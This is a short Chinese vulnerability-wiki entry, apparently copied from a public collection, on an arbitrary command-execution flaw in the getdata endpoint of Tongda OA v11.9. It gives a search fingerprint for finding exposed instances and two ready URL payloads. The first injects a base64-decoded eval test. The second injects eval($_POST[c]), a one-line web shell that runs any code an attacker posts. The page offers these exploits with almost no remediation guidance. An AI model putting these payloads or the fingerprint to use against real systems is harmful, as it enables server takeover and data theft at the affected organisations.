---
title: "通达OA v11.9 getdata 任意命令执行漏洞"
date: 2026-10-17 09:13:42
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "通达OA"
tags:
  - "通达OA"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

通达OA v11.9 getdata接口存在任意命令执行漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限

## 漏洞影响

```
通达OA v11.9
```

## 网络测绘

```
app="通达OA网络智能办公系统"
```

## 漏洞复现

登录页面

![image-20221008102828374](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202210081028459.png)

验证POC

```
/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage
```

![image-20221008102844264](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202210081028320.png)

```
/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[c]))%3B/*&id=19&module=Carouselimage
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%80%9A%E8%BE%BEOA-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
